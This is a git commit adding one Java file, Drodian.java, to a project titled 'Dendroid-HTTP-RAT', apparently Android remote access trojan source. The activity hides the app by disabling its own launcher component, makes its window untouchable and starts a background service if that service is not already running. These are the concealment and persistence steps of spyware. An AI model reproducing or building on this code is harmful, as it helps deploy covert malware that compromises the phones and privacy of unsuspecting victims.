5d58ee38f5816114045cb1d81beb6472ae08565c
Doge <lovely-doge@protonmail.com>
2016-12-28 11:00:42 +0900

    Dendroid-HTTP-RAT

---
+++ Dendroid APK/src/com/connect/Drodian.java
@@ -0,0 +1,40 @@
+package com.connect;
+
+import android.app.Activity;
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningServiceInfo;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.WindowManager;
+
+public class Drodian extends Activity {
+
+    @Override
+    public void onCreate(Bundle savedInstanceState) { 
+        super.onCreate(savedInstanceState);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE); 
+        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
+        PackageManager i = getApplicationContext().getPackageManager();
+        i.setComponentEnabledSetting(getComponentName(),PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+    	if(isMyServiceRunning()==false) 
+    	{		
+    		startService(new Intent(getApplicationContext(), MyService.class));
+    		Log.i("com.connect","startService");
+    	}
+    }
+    
+	private boolean isMyServiceRunning() {
+	    ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
+	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+	        if (MyService.class.getName().equals(service.service.getClassName())) {
+	            return true;
+	            
+	        }
+	    }
+	    return false;
+	}
+}
